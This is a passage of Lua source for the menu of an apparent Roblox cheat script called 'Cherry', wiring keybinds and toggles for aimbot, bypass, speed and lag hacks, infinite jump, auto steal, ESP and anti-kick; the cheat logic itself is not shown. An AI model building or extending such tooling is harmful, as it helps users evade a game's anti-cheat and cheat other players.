            if M.autoLeftEnabled then
                if M.autoRightEnabled then M.autoRightEnabled = false; M.stopAutoRight() end
                if M.autoBatEnabled then M.stopBatAimbot() end
                M.startAutoLeft()
            else M.stopAutoLeft() end
            if M.autoLeftSetVisual then M.autoLeftSetVisual(M.autoLeftEnabled) end
            if M.mobBtnRefs.autoLeft then M.mobBtnRefs.autoLeft(M.autoLeftEnabled) end
            saveCherryConfig()
        end
        if kbMatch(M.KB.AutoRight, kc) then
            M.autoRightEnabled = not M.autoRightEnabled
            if M.autoRightEnabled then
                if M.autoLeftEnabled then M.autoLeftEnabled = false; M.stopAutoLeft() end
                if M.autoBatEnabled then M.stopBatAimbot() end
                M.startAutoRight()
            else M.stopAutoRight() end
            if M.autoRightSetVisual then M.autoRightSetVisual(M.autoRightEnabled) end
            if M.mobBtnRefs.autoRight then M.mobBtnRefs.autoRight(M.autoRightEnabled) end
            saveCherryConfig()
        end
        if kbMatch(M.KB.AutoBat, kc) then
            if not M.autoBatEnabled then
                if M.autoLeftEnabled then M.autoLeftEnabled = false; M.stopAutoLeft() end
                if M.autoRightEnabled then M.autoRightEnabled = false; M.stopAutoRight() end
                M.queueAutoBatStart()
            else M.stopBatAimbot() end
            if M.autoBatSetVisual then M.autoBatSetVisual(M.autoBatEnabled) end
            if M.mobBtnRefs.autoBat then M.mobBtnRefs.autoBat(M.autoBatEnabled) end
            saveCherryConfig()
        end
        if kbMatch(M.KB.BypassAimbot, kc) then
            M.toggleBypassAimbot()
            if M.setBypassVisual then M.setBypassVisual(M.bypassAimbotEnabled) end
            if M.mobBtnRefs.bypass then M.mobBtnRefs.bypass(M.bypassAimbotEnabled) end
            saveCherryConfig()
        end
        if kbMatch(M.KB.TpBat, kc) then
            M.toggleTpBat()
            if M.mobBtnRefs.tpBat then M.mobBtnRefs.tpBat(M.tpBatEnabled) end
            saveCherryConfig()
        end
        if kbMatch(M.KB.GuiHide, kc) then
            if Frame then
                Frame.Visible = not Frame.Visible
                MinPill.Visible = not Frame.Visible
                M.menuOpen = Frame.Visible == true
                pcall(saveCherryConfig)
            end
        end
    end)

    -- ============================================================
    -- PAGINE
    -- ============================================================

    -- PAGE: SPEED
    local speedAutoBody = uiFoldSection(PM, "SPEED AUTO PLAY")
    local _, nsBox = uiNumberRow(speedAutoBody, "Normal Speed", M.NS, 1, 500, function(v) M.NS = v end)
    local _, csBox = uiNumberRow(speedAutoBody, "Carry Speed", M.CS, 1, 500, function(v) M.CS = v end)
    M.normalBox = nsBox; M.carryBox = csBox

    do
        local r = Instance.new("Frame"); r.ClipsDescendants=true; r.Size=UDim2.new(1,0,0,46)
        r.BackgroundColor3=UI_ROW_BG; r.BackgroundTransparency=0.03; r.BorderSizePixel=0; r.Parent=speedAutoBody; uiCardStyle(r)
        local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,14,0,0); l.Size=UDim2.new(1,-74,1,0)
        l.BackgroundTransparency=1; l.Text="Carry Mode"; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=14; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
        local carryBtn = uiSmallBtn({Parent=r, Pos=UDim2.new(1,-100,0.5,-13), Size=UDim2.new(0,88,0,26),
            Text=M.carrySpeedActive and "Carry On" or "Carry Off", Col=UI_TEXT_PRIMARY, TS=12, CR=6, SC=UI_ACCENT, STr=0.3})
        carryBtn.MouseButton1Click:Connect(function()
            M.carrySpeedActive = not M.carrySpeedActive
            carryBtn.Text = M.carrySpeedActive and "Carry On" or "Carry Off"
            M.refreshSpeedModeLabel()
            if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(M.carrySpeedActive) end
            if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(M.laggerCarryActive) end
            if M.carryModeBtn then M.carryModeBtn.Text = M.carrySpeedActive and "Carry On" or "Carry Off" end
            if M.laggerCarryBtn then M.laggerCarryBtn.Text = M.laggerCarryActive and "L.Carry On" or "L.Carry Off" end
            saveCherryConfig()
        end)
        M.carryModeBtn = carryBtn
    end

    local speedLagBody = uiFoldSection(PM, "SPEED LAGGER")
    local _, lsBox = uiNumberRow(speedLagBody, "Lagger Normal", M.LAGGER_SPEED, 1, 500, function(v) M.LAGGER_SPEED = v end)
    local _, lcBox = uiNumberRow(speedLagBody, "Lagger Carry", math.min(M.LAGGER_CARRY_SPEED,23), 1, 23, function(v) M.LAGGER_CARRY_SPEED = math.min(v,23) end)

    do
        local r = Instance.new("Frame"); r.ClipsDescendants=true; r.Size=UDim2.new(1,0,0,46)
        r.BackgroundColor3=UI_ROW_BG; r.BackgroundTransparency=0.03; r.BorderSizePixel=0; r.Parent=speedLagBody; uiCardStyle(r)
        local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,14,0,0); l.Size=UDim2.new(1,-74,1,0)
        l.BackgroundTransparency=1; l.Text="Lagger Mode"; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=14; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
        local modeBtn = uiSmallBtn({Parent=r, Pos=UDim2.new(1,-100,0.5,-13), Size=UDim2.new(0,88,0,26),
            Text=M.laggerModeEnabled and "Lag On" or "Lag Off", Col=UI_TEXT_PRIMARY, TS=12, CR=6, SC=UI_ACCENT, STr=0.3})
        modeBtn.MouseButton1Click:Connect(function()
            M.toggleLaggerMode()
            modeBtn.Text = M.laggerModeEnabled and "Lag On" or "Lag Off"
        end)
        M.laggerModeBtn = modeBtn
    end

    do
        local r = Instance.new("Frame"); r.ClipsDescendants=true; r.Size=UDim2.new(1,0,0,46)
        r.BackgroundColor3=UI_ROW_BG; r.BackgroundTransparency=0.03; r.BorderSizePixel=0; r.Parent=speedLagBody; uiCardStyle(r)
        local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,14,0,0); l.Size=UDim2.new(1,-74,1,0)
        l.BackgroundTransparency=1; l.Text="Lagger Carry Mode"; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=14; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
        local modeBtn = uiSmallBtn({Parent=r, Pos=UDim2.new(1,-100,0.5,-13), Size=UDim2.new(0,88,0,26),
            Text=M.laggerCarryActive and "L.Carry On" or "L.Carry Off", Col=UI_TEXT_PRIMARY, TS=12, CR=6, SC=UI_ACCENT, STr=0.3})
        modeBtn.MouseButton1Click:Connect(function()
            M.toggleLaggerCarry()
            modeBtn.Text = M.laggerCarryActive and "L.Carry On" or "L.Carry Off"
        end)
        M.laggerCarryBtn = modeBtn
    end

    -- Abajo, separado de las mini categorias
    local _, setAutoCarry = uiToggleRow(PM, "Auto Carry Speed", M.autoSwitchSpeedEnabled, function(on)
        M.autoSwitchSpeedEnabled = on
        M._autoSwitchWasSteal = nil
        if not on then
            if M.carryModeBtn then
                M.carryModeBtn.Text = M.carrySpeedActive and "Carry On" or "Carry Off"
            end
            if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(M.carrySpeedActive) end
        end
        M.refreshWalkSpeedAutoSwitch()
        saveCherryConfig()
    end)
    M.setAutoCarryVisual = setAutoCarry

    local _, setAutoTurnOff = uiToggleRow(PM, "Auto Turn Off Speed", M.autoTurnOffSpeedEnabled, function(on)
        M.autoTurnOffSpeedEnabled = on
        M.refreshWalkSpeedAutoSwitch()
        saveCherryConfig()
    end)
    M.setAutoTurnOffVisual = setAutoTurnOff

    local _, setAutoLagSwitch = uiToggleRow(PM, "Auto Switch Lagger Speed", M.autoSwitchLaggerSpeedEnabled, function(on)
        M.autoSwitchLaggerSpeedEnabled = on
        M.refreshWalkSpeedAutoSwitch()
        saveCherryConfig()
    end)
    M.setAutoSwitchLaggerVisual = setAutoLagSwitch

    -- PAGE: DUEL (antes MECHANICS)
    -- Aimbot / Bat TP / Auto Left / Auto Right: solo botones de pantalla + keybinds
    M.autoBatSetVisual = nil
    M.setBypassVisual = nil
    M.autoLeftSetVisual = nil
    M.autoRightSetVisual = nil

    uiSectionHeader(PMech, "MOTION")
    local _, setInfJump = uiToggleRow(PMech, "Infinite Jump", M.infJumpEnabled, function(on)
        M.infJumpEnabled = on and true or false
        if M.infJumpEnabled then
            M.startManualInfJumpLoop()
        else
            M.stopManualInfJumpLoop()
        end
        pcall(saveCherryConfig)
    end)
    M.setInfJumpVisual = setInfJump
    M.setJumpModeUI = nil

    local _, setATP = uiToggleRow(PMech, "Auto TP Down", M.autoTPEnabled, function(on)
        if on then
            M.startAutoTP()
        else
            M.stopAutoTP()
        end
        pcall(saveCherryConfig)
    end)
    M.setAutoTPVisual = setATP

    local _, tpHBox = uiNumberRow(PMech, "Auto TP Height", M.autoTPHeight, 1, 100, function(v) M.autoTPHeight = v end)
    M.autoTPHeightBox = tpHBox

    local _, setHoldJump = uiToggleRow(PMech, "Hold Jump", M.holdJumpEnabled, function(on)
        M.setHoldJump(on)
        saveCherryConfig()
    end)
    M.setHoldJumpVisual = setHoldJump

    local _, setMirrorTP = uiToggleRow(PMech, "Mirror TP Down", M.mirrorTPDownEnabled, function(on)
        M.setMirrorTPDown(on)
        saveCherryConfig()
    end)
    M.setMirrorTPVisual = setMirrorTP

    uiSectionHeader(PMech, "COMBAT")
    local _, setMedusa = uiToggleRow(PMech, "Medusa Counter", M.medusaCounterEnabled, function(on)
        M.medusaCounterEnabled = on
        if on then M.setupMedusa(player.Character) else M.stopMedusaCounter() end
    end)
    M.setMedusaVisual = setMedusa

    local _, setMedReset = uiToggleRow(PMech, "Medusa Reset", M.medusaResetEnabled, function(on)
        M.medusaResetEnabled = on
    end)
    M.setMedusaResetVisual = setMedReset

    local _, setAutoResetOnDeath = uiToggleRow(PMech, "Auto Reset on Death", M.autoResetOnDeath, function(on)
        M.autoResetOnDeath = on
        setupDeathReset()
    end)
    M.setAutoResetOnDeath = setAutoResetOnDeath

    local _, setBatCounter = uiToggleRow(PMech, "Bat Counter", M.batCounterEnabled, function(on)
        M.batCounterEnabled = on
        if on then M.startBatCounter() else M.stopBatCounter() end
    end)
    M.setBatCounterVisual = setBatCounter

    local _, setAntiRag = uiToggleRow(PMech, "Anti Ragdoll", M.antiRagdollEnabled, function(on)
        M.antiRagdollEnabled = on
        if on then M.startAntiRagdoll() else M.stopAntiRagdoll() end
    end)
    M.setAntiRagVisual = setAntiRag

    local _, setAntiRagModeUI = uiChoiceRow(PMech, "Anti Ragdoll Mode", {"Splatter","No Splatter"},
        M.antiRagdollMode == "No Splatter" and 2 or 1,
        function(newMode)
            M.antiRagdollMode = (newMode == "No Splatter") and "No Splatter" or "Splatter"
            if M.antiRagdollEnabled then M.stopAntiRagdoll(); M.startAntiRagdoll() end
        end
    )
    M.setAntiRagModeUI = setAntiRagModeUI

    local _, setHardHit = uiToggleRow(PMech, "Hard Hit", M.hardHitEnabled, function(on)
        M.setHardHit(on)
        saveCherryConfig()
    end)
    M.setHardHitVisual = setHardHit

    local _, hardHitRadiusBox = uiNumberRow(PMech, "Hard Hit Range", M.hardHitRadius or 10, 1, 100, function(v)
        M.setHardHitRadius(v)
        saveCherryConfig()
    end)
    M.hardHitRadiusBox = hardHitRadiusBox

    local _, setAntiBat = uiToggleRow(PMech, "Anti Bat", M.antiBatEnabled, function(on)
        M.setAntiBat(on)
        saveCherryConfig()
    end)
    M.setAntiBatVisual = setAntiBat

    local _, setLaggerPanel = uiToggleRow(PMech, "Lagger", M.laggerPanelEnabled, function(on)
        M.setLaggerPanel(on)
        saveCherryConfig()
    end)
    M.setLaggerPanelVisual = setLaggerPanel

    local _, setBypassPanel = uiToggleRow(PMech, "Bypass", M.bypassPanelEnabled, function(on)
        M.setBypassPanel(on)
        saveCherryConfig()
    end)
    M.setBypassPanelVisual = setBypassPanel

    uiSectionHeader(PMech, "STEAL")
    local stealModeLabels = {"V1", "V2", "V3"}
    local function stealLabelToMode(lab)
        if lab == "V2" then return "V2" end
        if lab == "V3" then return "V3" end
        return "V1"
    end
    local function stealModeToLabel(mode)
        if mode == "Semi" or mode == "V2" then return "V2" end
        if mode == "V3" then return "V3" end
        return "V1"
    end
    local stealDefaultIdx = 1
    do
        local lab = stealModeToLabel(M.stealMode)
        for i, v in ipairs(stealModeLabels) do if v == lab then stealDefaultIdx = i break end end
    end

    local _, setAutoSteal, setStealModeUI, regStealSettings = uiExpandToggleRow(
        PMech,
        "Auto Steal",
        M.Steal.AutoStealEnabled,
        stealModeLabels,
        stealDefaultIdx,
        function(on)
            M.Steal.AutoStealEnabled = on
            if on then M.startAutoSteal() else M.stopAutoSteal() end
        end,
        function(newLabel)
            local oldMode = M.stealMode
            M.stealMode = stealLabelToMode(newLabel)
            if oldMode ~= M.stealMode and M.Steal.AutoStealEnabled then
                M.stopAutoSteal(); M.startAutoSteal()
            end
            M.updateStatusRadius()
        end
    )
    M.setInstaGrab = setAutoSteal
    M.setStealModeUI = setStealModeUI

    -- V1 settings (shown only when V1 selected + arrow open)
    local v1Box = Instance.new("Frame"); v1Box.BackgroundTransparency=1; v1Box.Size=UDim2.new(1,0,0,0); v1Box.AutomaticSize=Enum.AutomaticSize.Y
    local v1Lay = Instance.new("UIListLayout"); v1Lay.Padding=UDim.new(0,6); v1Lay.Parent=v1Box
    local _, srBox = uiNumberRow(v1Box, "Grab Radius", M.Steal.StealRadius, 0.5, 300, function(v)
        M.Steal.StealRadius = v; M.setStealRadius(v); M.updateStatusRadius()
    end)
    M.radInput = srBox
    local _, sdBox = uiNumberRow(v1Box, "Hold Duration", M.Steal.StealDuration, 0.1, 10, function(v)
        M.Steal.StealDuration = v
    end)
    M.durationBox = sdBox
    local _, setAutoRadius = uiToggleRow(v1Box, "Auto Radius", M.autoRadiusEnabled, function(on)
        M.autoRadiusEnabled = on; M.updateStatusRadius()
    end)
    M.setAutoRadiusVisual = setAutoRadius
    regStealSettings("V1", v1Box)

    -- V2 settings
    local v2Box = Instance.new("Frame"); v2Box.BackgroundTransparency=1; v2Box.Size=UDim2.new(1,0,0,0); v2Box.AutomaticSize=Enum.AutomaticSize.Y
    local v2Lay = Instance.new("UIListLayout"); v2Lay.Padding=UDim.new(0,6); v2Lay.Parent=v2Box
    local _, semiRadBox = uiNumberRow(v2Box, "Semi Radius (max 10)", math.min(M.Semi.radius,10), 0.5, 10, function(v)
        M.Semi.radius = math.min(v,10)
        if semiRadBox then semiRadBox.Text = tostring(M.Semi.radius) end
    end)
    M.semiRadInput = semiRadBox
    local _, semiHoldMin = uiNumberRow(v2Box, "Hold Min", M.Semi.holdMin or 1.3, 0.1, 5, function(v) M.Semi.holdMin = v end)
    local _, semiHoldMax = uiNumberRow(v2Box, "Hold Max", M.Semi.holdMax or 2.6, 0.1, 8, function(v) M.Semi.holdMax = v end)
    regStealSettings("V2", v2Box)

    -- V3 settings
    local v3Box = Instance.new("Frame"); v3Box.BackgroundTransparency=1; v3Box.Size=UDim2.new(1,0,0,0); v3Box.AutomaticSize=Enum.AutomaticSize.Y
    local v3Lay = Instance.new("UIListLayout"); v3Lay.Padding=UDim.new(0,6); v3Lay.Parent=v3Box
    local _, v3Rad = uiNumberRow(v3Box, "Grab Radius", M.Steal.StealRadius, 0.5, 300, function(v)
        M.Steal.StealRadius = v; M.setStealRadius(v); M.updateStatusRadius()
    end)
    local _, v3Dur = uiNumberRow(v3Box, "Fill Duration", M.Steal.StealDuration, 0.1, 10, function(v)
        M.Steal.StealDuration = v
    end)
    -- Stop Time in seconds (how long after leaving range before fill cancels)
    do
        local r = Instance.new("Frame")
        r.ClipsDescendants = true
        r.Size = UDim2.new(1, 0, 0, 46)
        r.BackgroundColor3 = UI_ROW_BG
        r.BackgroundTransparency = 0.1
        r.BorderSizePixel = 0
        r.Parent = v3Box
        uiCardStyle(r)
        local l = Instance.new("TextLabel")
        l.Position = UDim2.new(0, 14, 0, 0)
        l.Size = UDim2.new(0.42, 0, 1, 0)
        l.BackgroundTransparency = 1
        l.Text = "Stop Time (s)"
        l.TextColor3 = UI_TEXT_PRIMARY
        l.TextSize = 13
        l.Font = Enum.Font.GothamMedium
        l.TextXAlignment = Enum.TextXAlignment.Left
        l.Parent = r

        local function clampStop(n)
            n = tonumber(n) or 0.35
            return math.clamp(n, 0.1, 30)
        end

        local box = Instance.new("TextBox")
        box.Name = "StopTimeBox"
        box.Position = UDim2.new(1, -118, 0.5, -13)
        box.Size = UDim2.new(0, 52, 0, 26)
        box.BackgroundColor3 = UI_BTN_BG
        box.BorderSizePixel = 0
        box.Text = string.format("%.2f", clampStop(M.Steal.StopTime))
        box.TextColor3 = UI_TEXT_PRIMARY
        box.TextSize = 12
        box.Font = Enum.Font.GothamBold
        box.ClearTextOnFocus = false
        box.Parent = r
        Instance.new("UICorner", box).CornerRadius = UDim.new(0, 7)

        local function applyStop(n)
            n = clampStop(n)
            M.Steal.StopTime = n
            box.Text = string.format("%.2f", n)
            saveCherryConfig()
        end

        box.FocusLost:Connect(function()
            applyStop(box.Text)
        end)

        local minus = uiSmallBtn({
            Parent = r, Pos = UDim2.new(1, -158, 0.5, -13), Size = UDim2.new(0, 28, 0, 26),
            Text = "-", Col = UI_TEXT_PRIMARY, TS = 14, CR = 7
        })
        local plus = uiSmallBtn({
            Parent = r, Pos = UDim2.new(1, -54, 0.5, -13), Size = UDim2.new(0, 28, 0, 26),
            Text = "+", Col = UI_TEXT_PRIMARY, TS = 14, CR = 7
        })
        minus.MouseButton1Click:Connect(function()
            applyStop((tonumber(M.Steal.StopTime) or 0.35) - 0.25)
        end)
        plus.MouseButton1Click:Connect(function()
            applyStop((tonumber(M.Steal.StopTime) or 0.35) + 0.25)
        end)

        M.stopTimeBox = box
    end
    local _, setAutoRadius3 = uiToggleRow(v3Box, "Auto Radius", M.autoRadiusEnabled, function(on)
        M.autoRadiusEnabled = on; M.updateStatusRadius()
    end)
    regStealSettings("V3", v3Box)

    local _, sbBox = uiNumberRow(PMech, "Steal Bar Width", M.stealBarSize, 220, 760, function(v)
        M.stealBarSize = v; M.buildStatusUI()
    end)
    local _, sbScaleBox = uiNumberRow(PMech, "Auto Steal Scale", M.stealBarScale, 0.4, 1.5, function(v)
        M.stealBarScale = math.clamp(v, 0.4, 1.5); M.buildStatusUI()
    end)


    -- PAGE: VISUALS
    uiSectionHeader(PVis, "SKY & VISION")
    do
        local r = Instance.new("Frame"); r.ClipsDescendants=true; r.Size=UDim2.new(1,0,0,46)
        r.BackgroundColor3=UI_ROW_BG; r.BackgroundTransparency=0.03; r.BorderSizePixel=0; r.Parent=PVis; uiCardStyle(r)
        local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,13,0,0); l.Size=UDim2.new(0.4,0,1,0)
        l.BackgroundTransparency=1; l.Text="Sky Theme"; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=13; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
        local skyLbl = Instance.new("TextLabel"); skyLbl.Position=UDim2.new(0.38,0,0,0); skyLbl.Size=UDim2.new(0.42,-4,1,0)
        skyLbl.BackgroundTransparency=1; skyLbl.Text=M.currentSkyTheme; skyLbl.TextColor3=UI_ACCENT; skyLbl.Font=Enum.Font.GothamBold; skyLbl.TextSize=12; skyLbl.TextXAlignment=Enum.TextXAlignment.Right; skyLbl.TextTruncate=Enum.TextTruncate.AtEnd; skyLbl.Parent=r
        local skyIdx = 1
        for i,nm in ipairs(M.SkyOrder) do if nm == M.currentSkyTheme then skyIdx = i; break end end
        local arrowBtn = Instance.new("TextButton")
        arrowBtn.Name = "SkyNext"
        arrowBtn.Size = UDim2.new(0, 34, 0, 28)
        arrowBtn.Position = UDim2.new(1, -44, 0.5, -14)
        arrowBtn.BackgroundColor3 = UI_BTN_BG or Color3.fromRGB(30, 20, 10)
        arrowBtn.BackgroundTransparency = 0.15
        arrowBtn.BorderSizePixel = 0
        arrowBtn.Text = ">"
        arrowBtn.TextColor3 = UI_ACCENT or Color3.fromRGB(255, 160, 50)
        arrowBtn.Font = Enum.Font.GothamBlack
        arrowBtn.TextSize = 18
        arrowBtn.AutoButtonColor = false
        arrowBtn.ZIndex = 3
        arrowBtn.Parent = r
        Instance.new("UICorner", arrowBtn).CornerRadius = UDim.new(0, 8)
        local aStroke = Instance.new("UIStroke", arrowBtn)
        aStroke.Color = UI_ACCENT or Color3.fromRGB(255, 160, 50)
        aStroke.Thickness = 1.5
        aStroke.Transparency = 0.25
        local function cycleSky()
            skyIdx = skyIdx % #M.SkyOrder + 1
            local nm = M.SkyOrder[skyIdx]
            skyLbl.Text = nm
            M.currentSkyTheme = nm
            M.CandyApplyCustomSky(nm)
            saveCherryConfig()
        end
        arrowBtn.Activated:Connect(cycleSky)
        -- click en la fila tambien cambia (igual que antes)
        local rowBtn = Instance.new("TextButton", r)
        rowBtn.Size = UDim2.new(1, -50, 1, 0)
        rowBtn.BackgroundTransparency = 1
        rowBtn.Text = ""
        rowBtn.ZIndex = 2
        rowBtn.Activated:Connect(cycleSky)
    end
    do
        local r = Instance.new("Frame"); r.ClipsDescendants=true; r.Size=UDim2.new(1,0,0,46)
        r.BackgroundColor3=UI_ROW_BG; r.BackgroundTransparency=0.03; r.BorderSizePixel=0; r.Parent=PVis; uiCardStyle(r)
        local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,13,0,0); l.Size=UDim2.new(0.55,0,1,0)
        l.BackgroundTransparency=1; l.Text="FOV"; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=13; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
        local fovLbl = Instance.new("TextLabel"); fovLbl.Position=UDim2.new(0.55,0,0,0); fovLbl.Size=UDim2.new(0.45,-10,1,0)
        fovLbl.BackgroundTransparency=1; fovLbl.Text=tostring(M.fovValue); fovLbl.TextColor3=UI_ACCENT; fovLbl.Font=Enum.Font.GothamBold; fovLbl.TextSize=12; fovLbl.TextXAlignment=Enum.TextXAlignment.Right; fovLbl.Parent=r
        local fovIdx = 1
        local btn = Instance.new("TextButton",r); btn.Size=UDim2.new(1,0,1,0); btn.BackgroundTransparency=1; btn.Text=""
        btn.Activated:Connect(function()
            fovIdx = fovIdx % #M.fovOptions + 1
            M.fovValue = M.fovOptions[fovIdx]; fovLbl.Text = tostring(M.fovValue); M.applyFOV(); saveCherryConfig()
        end)
    end

    uiSectionHeader(PVis, "GUI COLOUR")
    do
        local themeNames = {"Purple", "Orange", "Red", "Green", "Blue"}
        local cur = CherryConfig.Theme or "Orange"
        if not CHERRY_THEMES[cur] then cur = "Orange" end
        local idx = 1
        for i,n in ipairs(themeNames) do if n == cur then idx = i break end end

        local r = Instance.new("Frame"); r.ClipsDescendants=true; r.Size=UDim2.new(1,0,0,46)
        r.BackgroundColor3=UI_ROW_BG; r.BackgroundTransparency=0.03; r.BorderSizePixel=0; r.Parent=PVis; uiCardStyle(r)
        local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,13,0,0); l.Size=UDim2.new(0.4,0,1,0)
        l.BackgroundTransparency=1; l.Text="Theme"; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=13
        l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
        local themeLbl = Instance.new("TextLabel"); themeLbl.Position=UDim2.new(0.4,0,0,0); themeLbl.Size=UDim2.new(0.6,-10,1,0)
        themeLbl.BackgroundTransparency=1; themeLbl.Text=cur; themeLbl.TextColor3=UI_ACCENT
        themeLbl.Font=Enum.Font.GothamBold; themeLbl.TextSize=12; themeLbl.TextXAlignment=Enum.TextXAlignment.Right; themeLbl.Parent=r

        -- color swatches
        local sw = Instance.new("Frame"); sw.Size=UDim2.new(1,0,0,36); sw.BackgroundTransparency=1; sw.Parent=PVis
        local swLay = Instance.new("UIListLayout"); swLay.FillDirection=Enum.FillDirection.Horizontal
        swLay.Padding=UDim.new(0,6); swLay.VerticalAlignment=Enum.VerticalAlignment.Center; swLay.Parent=sw
        local function applyTheme(name)
            local t = CHERRY_THEMES[name]; if not t then return end
            CherryConfig.Theme = name
            M.colorScheme = name
            M._savedTheme = name
            applyAccentFromTheme()
            themeLbl.Text = name
            themeLbl.TextColor3 = t.Accent
            if M.mainFrame then
                M.mainFrame.BackgroundColor3 = UI_BG_DARK
                local st = M.mainFrame:FindFirstChild("MainStroke")
                if st then st.Color = t.Accent end
                local gr = M.mainFrame:FindFirstChild("MainGradient")
                if gr then
                    gr.Color = ColorSequence.new({
                        ColorSequenceKeypoint.new(0, UI_GRAD_TOP),
                        ColorSequenceKeypoint.new(0.45, UI_BG_DARK),
                        ColorSequenceKeypoint.new(1, UI_GRAD_BOT),
                    })
                end
            end
            -- Recolor any remaining pure-black parts immediately
            pcall(function()
                if M.mainFrame then M.recolorBlacksToTheme(M.mainFrame) end
                if M.mobGuiRef then M.recolorBlacksToTheme(M.mobGuiRef) end
                if M.statusGui then M.recolorBlacksToTheme(M.statusGui) end
            end)
            M.applyStealBarTheme(t.Accent)
            M.updateHeadTheme()
            saveCherryConfig()
            task.defer(function()
                local wasOpen = M.menuOpen ~= false
                applyAccentFromTheme()
                M.menuOpen = wasOpen
                M.buildGui()
                -- buildGui restores menuOpen from M.menuOpen
                pcall(function()
                    if M.mainFrame then M.recolorBlacksToTheme(M.mainFrame) end
                    if M.mobGuiRef then M.recolorBlacksToTheme(M.mobGuiRef) end
                    if M.statusGui then M.recolorBlacksToTheme(M.statusGui) end
                end)
                pcall(function() M.applyStealBarTheme(UI_ACCENT) end)
                pcall(function() M.updateHeadTheme() end)
                if M.mobileButtonsEnabled then
                    pcall(function() M.buildMobileButtons() end)
                end
                saveCherryConfig()
            end)
        end
        for _, name in ipairs(themeNames) do
            local t = CHERRY_THEMES[name]
            local b = Instance.new("TextButton")
            b.Size = UDim2.new(0, 28, 0, 16)
            b.BackgroundColor3 = t.Accent
            b.Text = ""
            b.AutoButtonColor = false
            b.Parent = sw
            Instance.new("UICorner", b).CornerRadius = UDim.new(0, 4)
            local st = Instance.new("UIStroke"); st.Color = Color3.fromRGB(255,255,255); st.Transparency = 0.4; st.Parent = b
            b.MouseButton1Click:Connect(function() applyTheme(name) end)
        end
        local btn = Instance.new("TextButton", r); btn.Size=UDim2.new(1,0,1,0); btn.BackgroundTransparency=1; btn.Text=""
        btn.Activated:Connect(function()
            idx = idx % #themeNames + 1
            applyTheme(themeNames[idx])
        end)
    end

    uiSectionHeader(PVis, "ESP")
    local _, setLineESP = uiToggleRow(PVis, "Line ESP", M.lineESPEnabled, function(on)
        M.lineESPEnabled = on; cherryESPState.LineESP = on
    end)
    local _, setSpeedESP = uiToggleRow(PVis, "Speed ESP", M.speedESPEnabled, function(on)
        M.speedESPEnabled = on; cherryESPState.SpeedESP = on
    end)

    -- PAGE: UTILITY
    uiSectionHeader(PUtil, "MISC")
    local _, setAntiLag = uiToggleRow(PUtil, "Anti-Lag", M.antiLagEnabled, function(on)
        M.antiLagEnabled = on
        if on then M.enableAntiLag() else M.disableAntiLag() end
        saveCherryConfig()
    end)
    M.setAntiLagVisual = setAntiLag

    local _, setUnwalk = uiToggleRow(PUtil, "Unwalk", M.unwalkEnabled, function(on)
        M.unwalkEnabled = on
        if on then M.startUnwalk() else M.stopUnwalk() end
    end)
    M.setUnwalkVisual = setUnwalk

    local _, setAntiKick = uiToggleRow(PUtil, "Anti-Kick", M.antiKickEnabled, function(on)
        M.antiKickEnabled = on
        if on then M.enableAntiKick() else M.disableAntiKick() end
        saveCherryConfig()
    end)
    M.antiKickSetVisual = setAntiKick

    local _, setStretch = uiToggleRow(PUtil, "Stretch Rez", M.stretchRezEnabled, function(on)
        M.stretchRezEnabled = on
        if on then M.enableStretchRez() else M.disableStretchRez() end
    end)
    M.setStretchRezVisual = setStretch

    local _, setAntiSummer = uiToggleRow(PUtil, "Anti Summer Base", M.antiSummerBaseEnabled, function(on)
        M.antiSummerBaseEnabled = on
        if on then M.enableAntiSummerBase() else M.disableAntiSummerBase() end
        saveCherryConfig()
    end)
    M.setAntiSummerVisual = setAntiSummer

    local _, setRemoveAcc = uiToggleRow(PUtil, "Remove Accessories", M.removeAccEnabled, function(on)
        M.removeAccEnabled = on
        if on then M.startRemoveAcc() else M.stopRemoveAcc() end
    end)

    local _, setSafeMode = uiToggleRow(PUtil, "Safe Mode", M.safeModeEnabled, function(on)
        M.safeModeEnabled = on
        if on then M.enableSafeMode() else M.disableSafeMode() end
        saveCherryConfig()
    end)
    M.setSafeModeVisual = setSafeMode

    do
        local fontIdx = 1
        for i, n in ipairs(M.FONT_NAMES) do
            if n == (M.customFontSelected or "None") then fontIdx = i break end
        end
        local _, setFontUI = uiChoiceRow(PUtil, "Custom Font", M.FONT_NAMES, fontIdx, function(v)
            M.applyCustomFont(v)
            saveCherryConfig()
        end)
    end

    local _, setIntro = uiToggleRow(PUtil, "Intro Song", M.introSoundEnabled, function(on)
        M.introSoundEnabled = on
        if not on and introSoundInstance and introSoundInstance.IsPlaying then
            pcall(function() introSoundInstance:Stop() end)
        end
    end)

    local _, setIntroSongUI = uiChoiceRow(PUtil, "Intro Song Choice", {"Song 1","Song 2","Song 3"},
        M.introSongChoice or 3,
        function(v)
            local map = {["Song 1"]=1, ["Song 2"]=2, ["Song 3"]=3}
            M.introSongChoice = map[v] or 3
        end
    )

    local _, setIntroGUI = uiToggleRow(PUtil, "Intro GUI", M.introGUIEnabled, function(on)
        M.introGUIEnabled = on
    end)

    local _, setMobBtns = uiToggleRow(PUtil, "Mobile Buttons", M.mobileButtonsEnabled, function(on)
        M.mobileButtonsEnabled = on
        if on then M.buildMobileButtons() else M.destroyMobileButtons() end
        saveCherryConfig()
    end)

